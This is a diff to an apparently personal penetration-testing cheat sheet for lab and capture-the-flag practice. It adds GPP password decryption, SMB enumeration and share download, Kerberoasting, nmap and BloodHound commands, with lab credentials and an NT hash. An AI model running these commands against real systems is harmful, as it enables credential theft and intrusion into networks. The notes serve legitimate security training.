@@ -1,5 +1,6 @@
 # FEEL LIKE STUCK???
 - Did we try ftp login with admin:admin, ftp:ftp etc?
+- Did we check Groups.xml?(crack with gpp-decrypt)
 - Did we try enum4linux,smbclient,smbmap anonymously?
 - Did we look into any suspicious binaries using strings?
 - Did we try reverse shell with port with 443,80,445? (Learn this from PG Practice Helpdesk, Craft2)
@@ -23,7 +24,8 @@
 # NMAP tips
 ```bash
 nmap --script "ldap* and not brute" $ip -p 389 -v -Pn -sT
-
+sudo nmap -A -p- -T4 192.168.245.145
+sudo nmap -sU --open --top-ports 20 -sV 192.168.245.149
 ```
 
 
@@ -165,7 +167,6 @@ SeManageVolumePrivilege
 ## secretsdump
 ```bash
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
-
 ```
 
 
@@ -174,8 +175,17 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 enum4linux -a 192.168.201.175
 ```
 
+## gpp-decrypt
+```bash
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ                                            
+```
+
+
 ## smbmap
 ```bash
+smbmap -H 10.129.193.5
+smbmap -u svc_tgs -p GPPstillStandingStrong2k18 -d active.htb -H 10.129.193.5
+
 ```
 
 ## PowerView.ps1
@@ -233,6 +243,8 @@ impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast
 ## Kerberoast
 ```bash
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
+GetUserSPNs.py -request -dc-ip 10.129.193.5 active.htb/svc_tgs
+
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 ```
 
@@ -425,6 +437,11 @@ crackmapexec smb <% ["RHOST"] %> -u "" -p "" --pass-pol
 
 ## smbclient
 ```bash
+smbclient //10.129.193.5/Replication
+smb: \> RECURSE ON
+smb: \> PROMPT OFF
+smb: \> mget *
+
 smbclient \\\\192.168.161.31\\share -U 'Administrator' -N
 smbclient \\\\192.168.50.212\\share -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
 
@@ -461,14 +478,6 @@ snmpwalk -v2c -c public 192.168.195.149 NET-SNMP-EXTEND-MIB::nsExtendObjects
 ## socat
 ```bash
 sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
-```
-
-
-## NMAP
-```bash
-sudo nmap -A -p- -T4 192.168.245.145
-sudo nmap -sU --open --top-ports 20 -sV 192.168.245.149
-
 ```
 
 ## Reverse shell
@@ -767,9 +776,10 @@ rdesktop -u Administrator 192.168.245.165
 xfreerdp /v:192.168.x.x /u:username /p:password
 ```
 
-## Bloodhound
+## Bloodhound-python
 ```bash
 bloodhound-python -d hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.245.122 
+bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 
 ```
 
